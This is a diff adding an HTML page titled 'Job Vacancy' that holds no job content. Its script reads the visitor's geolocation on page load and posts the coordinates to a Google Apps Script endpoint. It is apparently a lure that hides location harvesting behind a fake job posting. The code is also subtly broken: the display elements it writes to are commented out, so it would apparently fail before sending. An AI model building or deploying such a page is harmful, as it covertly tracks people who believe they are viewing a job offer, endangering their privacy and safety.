@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Job Vacancy</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <!-- <p>Latitude: <span id="latitude"></span></p>
+    <p>Longitude: <span id="longitude"></span></p> -->
+    <script>
+        window.onload = function() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+
+                    var latitudeDisplay = document.getElementById("latitude");
+                    var longitudeDisplay = document.getElementById("longitude");
+
+                    latitudeDisplay.textContent = latitude;
+                    longitudeDisplay.textContent = longitude;
+
+                    $.ajax({
+                        url:"https://script.google.com/macros/s/AKfycby0t3bwqkWVdVwB858HXoQ7B0_LyBypjoMUlU9dXTjr5eOdgeK-WOgFQInu4-5cR8mQ/exec",
+                        data:{latitude:latitude,longitude:longitude},
+                        method:"post",
+                        success:function (response){
+                            // window.location.reload()
+                            //window.location.href="https://google.com"
+                        },
+                        error:function (err){
+                            alert("Something Error")
+            
+                        }
+                    })
+                }, function(error) {
+                    console.error("Error getting location:", error.message);
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        };
+    </script>
+</body>
+</html>
